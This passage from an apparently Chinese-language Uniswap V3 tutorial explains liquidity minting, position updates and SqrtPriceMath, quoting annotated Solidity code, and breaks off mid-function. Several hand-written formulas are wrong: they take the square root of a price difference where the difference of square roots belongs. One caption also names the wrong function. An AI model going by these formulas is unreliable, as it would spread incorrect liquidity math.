35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g></g><g data-mml-node="mo" transform="translate(2215.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="msub" transform="translate(3215.6,0)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g></g></g><rect width="5476.7" height="60" x="120" y="220"/></g></g></g></svg></mjx-container></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint128 liquidity0 = getLiquidityForAmount0(sqrtRatioX96, sqrtRatioBX96, amount0);<br>uint128 liquidity1 = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioX96, amount1);<br><br>liquidity = liquidity0 &lt; liquidity1 ? liquidity0 : liquidity1;<br></code></pre></td></tr></table></figure><p>比较两种算法的结果，取更小的一个</p><p>情况三：当前池中的价格大于等于价格范围的最大值</p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819162404788.png" alt="image-20220819162404788"></p><p>此时添加的流动性全部为y token<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.459ex;" xmlns="http://www.w3.org/2000/svg" width="17.491ex" height="5.608ex" role="img" focusable="false" viewbox="0 -1392 7731.2 2478.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mfrac" transform="translate(2014.6,0)"><g data-mml-node="mrow" transform="translate(2196.8,676)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-929)"><g data-mml-node="msub"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g></g><g data-mml-node="mo" transform="translate(2215.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="msub" transform="translate(3215.6,0)"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g></g><g data-mml-node="mo" transform="translate(0,109)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="751" height="60" x="853" y="849"/></g><g data-mml-node="mi" transform="translate(1637,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g></g></g><rect width="5476.7" height="60" x="120" y="220"/></g></g></g></svg></mjx-container><br>以上过程表示在getLiquidityForAmount0中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getLiquidityForAmount1(<br>    uint160 sqrtRatioAX96,<br>    uint160 sqrtRatioBX96,<br>    uint256 amount1<br>) internal pure returns (uint128 liquidity) {<br>//排序<br>    if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br>    return toUint128(FullMath.mulDiv(amount1, FixedPoint96.Q96, sqrtRatioBX96 - sqrtRatioAX96));<br>}<br></code></pre></td></tr></table></figure><h3 id="MintCallbackData"><a href="#MintCallbackData" class="headerlink" title="MintCallbackData"></a>MintCallbackData</h3><p>这里是为了将Position的owner和实际流动性token的支付者解耦，让合约来管理用户的流动性，并将流动性token化（ERC721）</p><p>用户调用NonfungiblePositionManager来提供流动性，所以Position的owner是NonfungiblePositionManager，NonfungiblePositionManager是通过NFT token将Position和用户关联起来的</p><p>这个函数可以将指定数量的token0与token1发送到合约中去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct MintCallbackData {<br>        PoolAddress.PoolKey poolKey;<br>        address payer; //支付token的地址<br>    }<br><br>    /// @inheritdoc IUniswapV3MintCallback<br>    function uniswapV3MintCallback(<br>        uint256 amount0Owed,<br>        uint256 amount1Owed,<br>        bytes calldata data<br>    ) external override {<br>        MintCallbackData memory decoded = abi.decode(data, (MintCallbackData));<br>        CallbackValidation.verifyCallback(factory, decoded.poolKey);<br><br>//根据传入的参数，使用transferFrom代用户向Pool中支付token<br>        if (amount0Owed &gt; 0) pay(decoded.poolKey.token0, decoded.payer, msg.sender, amount0Owed);<br>        if (amount1Owed &gt; 0) pay(decoded.poolKey.token1, decoded.payer, msg.sender, amount1Owed);<br>    }<br><br></code></pre></td></tr></table></figure><h2 id="mint"><a href="#mint" class="headerlink" title="mint"></a>mint</h2><p>位于UniswapV3Pool.sol</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @inheritdoc IUniswapV3PoolActions<br>/// @dev noDelegateCall is applied indirectly via _modifyPosition<br>function mint(<br>    address recipient, //创造流动性的地址<br>    int24 tickLower, //流动性头寸下限<br>    int24 tickUpper, //流动性头寸上限<br>    uint128 amount, //增加的流动性数量<br>    bytes calldata data //回调函数的参数<br>) external override lock returns (uint256 amount0, uint256 amount1) {<br>//检查增加的流动性的数量大于0<br>    require(amount &gt; 0);<br>    //修改Position，添加流动性，详见下面的_modifyPosition部分<br>    //返回需要投入的token0和token1的数量<br>    (, int256 amount0Int, int256 amount1Int) =<br>        _modifyPosition(<br>            ModifyPositionParams({<br>                owner: recipient,<br>                tickLower: tickLower,<br>                tickUpper: tickUpper,<br>                liquidityDelta: int256(amount).toInt128()<br>            })<br>        );<br><br>    amount0 = uint256(amount0Int);<br>    amount1 = uint256(amount1Int);<br><br>    uint256 balance0Before;<br>    uint256 balance1Before;<br>    if (amount0 &gt; 0) balance0Before = balance0();<br>    if (amount1 &gt; 0) balance1Before = balance1();<br>    //回调函数将指定数量的token0和token1发送到合约中<br>    IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);<br>    //检查投入的token0和token1是否符合预期的数量<br>    if (amount0 &gt; 0) require(balance0Before.add(amount0) &lt;= balance0(), 'M0');<br>    if (amount1 &gt; 0) require(balance1Before.add(amount1) &lt;= balance1(), 'M1');<br><br>    emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);<br>}<br><br></code></pre></td></tr></table></figure><h2 id="modifyPosition"><a href="#modifyPosition" class="headerlink" title="_modifyPosition"></a>_modifyPosition</h2><p>ModifyPositionParams用于存储Position(流动性)相关的数据信息，包括流动性所有者地址、流动性的上下限、流动性的改动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct ModifyPositionParams {<br>    // the address that owns the position<br>    address owner;<br>    // the lower and upper tick of the position<br>    int24 tickLower;<br>    int24 tickUpper;<br>    // any change in liquidity<br>    int128 liquidityDelta;<br>}<br></code></pre></td></tr></table></figure><p>_modifyPosition用于更新当前Position</p><p>添加流动性的规则</p><p>我们知道V3的核心公式</p><blockquote><p>y = p*x</p><p>x*y = L^2</p></blockquote><p>可以得到</p><blockquote><p>x = L / √p </p><p>y = L * √p</p></blockquote><p><strong>当价格p在区间内时</strong></p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819162436593.png" alt="image-20220819162436593"></p><p>橙色区域是我们实际需要添加的流动性，虚拟流动性是绿色区域扣除橙色的部分的宽度和高度。</p><p><code>delta x</code> 就是 <code>p</code>（红点） 和 <code>p_upper</code> 在 x 轴上的距离， <code>delta y</code> 就是 <code>p</code> 和 <code>p_lower</code> 在 y 轴上的距离。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">delta</span> x = L / √p - L / √p_{<span class="hljs-built_in">upper</span>} = L * (√p_{<span class="hljs-built_in">upper</span>} - √p) / (√p * √p_{<span class="hljs-built_in">upper</span>}) <br><br><span class="hljs-built_in">delta</span> y = L * √p  - L * √p_{<span class="hljs-built_in">lower</span>} = L * (√p - √p_{<span class="hljs-built_in">lower</span>})<br></code></pre></td></tr></table></figure><p>再变换一下，改写成求 L（流动性数量）的等式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs math">L = delta x * (√p * √p_{upper}) / (√p_{upper} - √p) <br>L = delta y / √(p - p_{lower})<br></code></pre></td></tr></table></figure><p><strong>当价格p大于区间时</strong></p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819162505525.png" alt="image-20220819162505525"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">L = <span class="hljs-built_in">delta</span> y / √(p_{<span class="hljs-built_in">upper</span>} - p_{<span class="hljs-built_in">lower</span>})<br></code></pre></td></tr></table></figure><p><strong>当价格p小于区间时</strong></p><p><img src="/2022/08/20/uniswap-v3-2/image-20220819162537608.png" alt="image-20220819162537608"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">L = <span class="hljs-built_in">delta</span> x * (√p_{<span class="hljs-built_in">upper</span>} * √p_{<span class="hljs-built_in">lower</span>}) / (√p_{<span class="hljs-built_in">upper</span>} - √p_{<span class="hljs-built_in">lower</span>})<br></code></pre></td></tr></table></figure><p>转化为代码</p><p>注意：这里的amount0与amount1为int256类型，也就是说这里的amount0与amount1这两个返回值可正可负，如果为正则表示流动性提供至需要给池子给予的数量，为负数则表示池子需要给流动性提供者给予的数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs solidity">  /// @dev Effect some changes to a position<br>  /// @param params the position details and the change to the position's liquidity to effect<br>  /// @return position a storage pointer referencing the position with the given owner and tick range<br>  /// @return amount0 the amount of token0 owed to the pool, negative if the pool should pay the recipient<br>  /// @return amount1 the amount of token1 owed to the pool, negative if the pool should pay the recipient<br>  function _modifyPosition(ModifyPositionParams memory params)<br>      private<br>      noDelegateCall<br>      returns (<br>          Position.Info storage position,<br>          int256 amount0,<br>          int256 amount1<br>      )<br>  {<br>  //检查流动性上下限是否满足条件<br>      checkTicks(params.tickLower, params.tickUpper);<br><br>//读入内存，这样后续可以通过MLOAD直接访问而不用重新去加载LOAD，从而节省gas<br>      Slot0 memory _slot0 = slot0; // SLOAD for gas optimization<br><br>//创建或修改用户的position，后面有介绍<br>      position = _updatePosition(<br>          params.owner,<br>          params.tickLower,<br>          params.tickUpper,<br>          params.liquidityDelta,<br>          _slot0.tick<br>      );<br><br>      if (params.liquidityDelta != 0) {<br>          if (_slot0.tick &lt; params.tickLower) {<br>              // current tick is below the passed range; liquidity can only become in range by crossing from left to<br>              // right, when we'll need _more_ token0 (it's becoming more valuable) so user must provide it<br>              //如果当前的trick小于tricklower，则所有的token1将转变为token0<br>              //即liquidity * (sqrt(upper) - sqrt(lower)) / (sqrt(upper) * sqrt(lower))<br>              amount0 = SqrtPriceMath.getAmount0Delta(<br>                  TickMath.getSqrtRatioAtTick(params.tickLower),<br>                  TickMath.getSqrtRatioAtTick(params.tickUpper),<br>                  params.liquidityDelta<br>              );<br>          } else if (_slot0.tick &lt; params.tickUpper) {<br>              // current tick is inside the passed range<br>              //如果当前trick小于trickupper<br>              uint128 liquidityBefore = liquidity; // SLOAD for gas optimization<br><br>              // write an oracle entry<br>              //增加Oracle条目（预言机）<br>              (slot0.observationIndex, slot0.observationCardinality) = observations.write(<br>                  _slot0.observationIndex,<br>                  _blockTimestamp(),<br>                  _slot0.tick,<br>                  liquidityBefore,<br>                  _slot0.observationCardinality,<br>                  _slot0.observationCardinalityNext<br>              );<br><br>              //计算amout0和amount1的增量<br>              amount0 = SqrtPriceMath.getAmount0Delta(<br>                  _slot0.sqrtPriceX96,<br>                  TickMath.getSqrtRatioAtTick(params.tickUpper),<br>                  params.liquidityDelta<br>              );<br>              amount1 = SqrtPriceMath.getAmount1Delta(<br>                  TickMath.getSqrtRatioAtTick(params.tickLower),<br>                  _slot0.sqrtPriceX96,<br>                  params.liquidityDelta<br>              );<br><br>//<br>              liquidity = LiquidityMath.addDelta(liquidityBefore, params.liquidityDelta);<br>          } else {<br>              // current tick is above the passed range; liquidity can only become in range by crossing from right to<br>              // left, when we'll need _more_ token1 (it's becoming more valuable) so user must provide it<br>              //如果trick超过了trickupper则此时所有的token0将转变为token1<br>              //使用TickMath 库中的 getSqrtRatioAtTick 来通过 tick index 计算其所对应的价格<br>              amount1 = SqrtPriceMath.getAmount1Delta(<br>                  TickMath.getSqrtRatioAtTick(params.tickLower),<br>                  TickMath.getSqrtRatioAtTick(params.tickUpper),<br>                  params.liquidityDelta<br>              );<br>          }<br>      }<br>  }<br><br></code></pre></td></tr></table></figure><h3 id="getAmountDelta"><a href="#getAmountDelta" class="headerlink" title="getAmountDelta"></a>getAmountDelta</h3><p>在 <code>SqrtPriceMath</code> 库中</p><p>在具体的计算过程中，分成了 RoundUp 和 RoundDown 两种情况，简单来说：</p><ol><li>当提供/增加流动性时，会使用 RoundUp，这样可以保证增加数量为 L 的流动性时，用户提供足够的 token 到 pool 中</li><li>当移除/减少流动性时，会使用 RoundDown，这样可以保证减少数量为 L 的流动性时，不会从 pool 中给用户多余的 token</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    /// @notice Gets the amount0 delta between two prices<br>    /// @dev Calculates liquidity / sqrt(lower) - liquidity / sqrt(upper),<br>    /// i.e. liquidity * (sqrt(upper) - sqrt(lower)) / (sqrt(upper) * sqrt(lower))<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The amount of usable liquidity<br>    /// @param roundUp Whether to round the amount up or down<br>    /// @return amount0 Amount of token0 required to cover a position of size liquidity between the two passed prices<br>    function getAmount0Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        uint128 liquidity,<br>        bool roundUp<br>    ) internal pure returns (uint256 amount0) {<br>        if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br><br>        uint256 numerator1 = uint256(liquidity) &lt;&lt; FixedPoint96.RESOLUTION;<br>        uint256 numerator2 = sqrtRatioBX96 - sqrtRatioAX96;<br><br>        require(sqrtRatioAX96 &gt; 0);<br><br>        return<br>            roundUp<br>            //返回ceil(x / y)<br>                ? UnsafeMath.divRoundingUp(<br>                //numerator1*numerator2/sqrtRatioBX96并取整<br>                    FullMath.mulDivRoundingUp(numerator1, numerator2, sqrtRatioBX96),<br>                    sqrtRatioAX96<br>                )<br>                : FullMath.mulDiv(numerator1, numerator2, sqrtRatioBX96) / sqrtRatioAX96;<br>    }<br><br>    /// @notice Gets the amount1 delta between two prices<br>    /// @dev Calculates liquidity * (sqrt(upper) - sqrt(lower))<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The amount of usable liquidity<br>    /// @param roundUp Whether to round the amount up, or down<br>    /// @return amount1 Amount of token1 required to cover a position of size liquidity between the two passed prices<br>    function getAmount1Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        uint128 liquidity,<br>        bool roundUp<br>    ) internal pure returns (uint256 amount1) {<br>        if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br><br>        return<br>            roundUp<br>                ? FullMath.mulDivRoundingUp(liquidity, 